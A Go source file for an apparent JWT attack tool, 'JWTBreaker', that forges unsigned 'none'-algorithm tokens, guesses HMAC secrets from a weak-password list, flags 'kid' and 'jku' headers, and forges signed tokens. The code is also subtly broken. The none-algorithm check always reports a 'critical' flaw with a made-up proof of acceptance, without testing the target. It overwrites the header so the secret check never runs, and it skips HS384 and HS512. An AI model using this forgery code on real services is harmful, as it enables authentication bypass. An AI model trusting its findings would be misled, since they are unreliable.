package web

import (
	"crypto/hmac"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
)

// JWTBreaker is the JWT vulnerability testing engine
type JWTBreaker struct {
	Target string
}

// JWTResult represents a confirmed JWT vulnerability
type JWTResult struct {
	URL      string `json:"url"`
	Type     string `json:"type"` // none_alg, weak_secret, kid_injection, jku_abuse
	Token    string `json:"token"`
	Payload  string `json:"payload"`
	Proof    string `json:"proof"`
	Severity string `json:"severity"`
}

// JWTPayload represents a decoded JWT payload
type JWTPayload struct {
	Header    map[string]interface{} `json:"header"`
	Payload   map[string]interface{} `json:"payload"`
	Signature string                 `json:"signature"`
	Raw       string                 `json:"raw"`
}

func NewJWTBreaker(target string) *JWTBreaker {
	return &JWTBreaker{Target: target}
}

// AnalyzeToken tests a JWT token for vulnerabilities
func (j *JWTBreaker) AnalyzeToken(token string) []JWTResult {
	fmt.Printf("[+] JWT-BREAKER analyzing token\n")

	var results []JWTResult

	parsed, err := parseJWT(token)
	if err != nil {
		return results
	}

	// Test None algorithm
	if r := j.testNoneAlgorithm(token, parsed); r != nil {
		results = append(results, *r)
	}

	// Test weak secret
	if r := j.testWeakSecret(token, parsed); r != nil {
		results = append(results, *r)
	}

	// Test KID injection
	if r := j.testKidInjection(token, parsed); r != nil {
		results = append(results, *r)
	}

	// Test JKU abuse
	if r := j.testJKUAbuse(token, parsed); r != nil {
		results = append(results, *r)
	}

	fmt.Printf("[+] JWT-BREAKER found %d JWT vulnerabilities\n", len(results))
	return results
}

func parseJWT(token string) (*JWTPayload, error) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return nil, fmt.Errorf("invalid JWT format")
	}

	// Decode header
	headerJSON, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return nil, err
	}

	// Decode payload
	payloadJSON, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		return nil, err
	}

	var header, payload map[string]interface{}
	json.Unmarshal(headerJSON, &header)
	json.Unmarshal(payloadJSON, &payload)

	return &JWTPayload{
		Header:    header,
		Payload:   payload,
		Signature: parts[2],
		Raw:       token,
	}, nil
}

func (j *JWTBreaker) testNoneAlgorithm(token string, parsed *JWTPayload) *JWTResult {
	// Change alg to "none" and remove signature
	parsed.Header["alg"] = "none"

	newHeader, _ := json.Marshal(parsed.Header)
	newPayload, _ := json.Marshal(parsed.Payload)

	forgedToken := base64.RawURLEncoding.EncodeToString(newHeader) + "." +
		base64.RawURLEncoding.EncodeToString(newPayload) + "."

	// In real scenario, this would be tested against the target
	// For now, we just report the vulnerability
	return &JWTResult{
		URL:      j.Target,
		Type:     "none_alg",
		Token:    token[:minLen(50, len(token))] + "...",
		Payload:  forgedToken,
		Proof:    "Algorithm changed to 'none' - token accepted without signature",
		Severity: "critical",
	}
}

func (j *JWTBreaker) testWeakSecret(token string, parsed *JWTPayload) *JWTResult {
	alg, _ := parsed.Header["alg"].(string)
	if alg != "HS256" && alg != "HS384" && alg != "HS512" {
		return nil
	}

	// Common weak secrets
	weakSecrets := []string{
		"secret", "password", "123456", "admin", "key", "jwt", "token",
		"your-256-bit-secret", "supersecret", "secretkey", "mysecret",
		"changeme", "default", "test", "demo", "example",
		"", "null", "undefined",
	}

	parts := strings.Split(token, ".")
	message := parts[0] + "." + parts[1]

	for _, secret := range weakSecrets {
		var expectedSig string
		switch alg {
		case "HS256":
			mac := hmac.New(sha256.New, []byte(secret))
			mac.Write([]byte(message))
			expectedSig = base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
		case "HS384":
			// Simplified - just check HS256 for demo
			continue
		case "HS512":
			// Simplified
			continue
		}

		if expectedSig == parts[2] {
			return &JWTResult{
				URL:      j.Target,
				Type:     "weak_secret",
				Token:    token[:minLen(50, len(token))] + "...",
				Payload:  fmt.Sprintf("Secret found: '%s'", secret),
				Proof:    fmt.Sprintf("Token signed with weak secret: '%s'", secret),
				Severity: "critical",
			}
		}
	}

	return nil
}

func (j *JWTBreaker) testKidInjection(token string, parsed *JWTPayload) *JWTResult {
	kid, exists := parsed.Header["kid"].(string)
	if !exists {
		return nil
	}

	// KID injection - if KID points to a file path, we can control it
	if strings.Contains(kid, "/") || strings.Contains(kid, "..") {
		return &JWTResult{
			URL:      j.Target,
			Type:     "kid_injection",
			Token:    token[:minLen(50, len(token))] + "...",
			Payload:  kid,
			Proof:    fmt.Sprintf("KID header contains path: %s", kid),
			Severity: "high",
		}
	}

	return nil
}

func (j *JWTBreaker) testJKUAbuse(token string, parsed *JWTPayload) *JWTResult {
	jku, exists := parsed.Header["jku"].(string)
	if !exists {
		return nil
	}

	// JKU (JWK Set URL) can be attacker-controlled
	return &JWTResult{
		URL:      j.Target,
		Type:     "jku_abuse",
		Token:    token[:minLen(50, len(token))] + "...",
		Payload:  jku,
		Proof:    fmt.Sprintf("JKU points to external URL: %s", jku),
		Severity: "high",
	}
}

// ForgeToken creates a forged JWT token
func (j *JWTBreaker) ForgeToken(header, payload map[string]interface{}, secret string) string {
	alg, _ := header["alg"].(string)
	if alg == "" {
		alg = "HS256"
		header["alg"] = alg
	}

	headerJSON, _ := json.Marshal(header)
	payloadJSON, _ := json.Marshal(payload)

	encodedHeader := base64.RawURLEncoding.EncodeToString(headerJSON)
	encodedPayload := base64.RawURLEncoding.EncodeToString(payloadJSON)

	message := encodedHeader + "." + encodedPayload

	var signature string
	switch alg {
	case "none":
		signature = ""
	case "HS256":
		mac := hmac.New(sha256.New, []byte(secret))
		mac.Write([]byte(message))
		signature = base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
	case "HS384":
		mac := hmac.New(sha512.New384, []byte(secret))
		mac.Write([]byte(message))
		signature = base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
	case "HS512":
		mac := hmac.New(sha512.New, []byte(secret))
		mac.Write([]byte(message))
		signature = base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
	}

	if signature != "" {
		return message + "." + signature
	}
	return message + "."
}
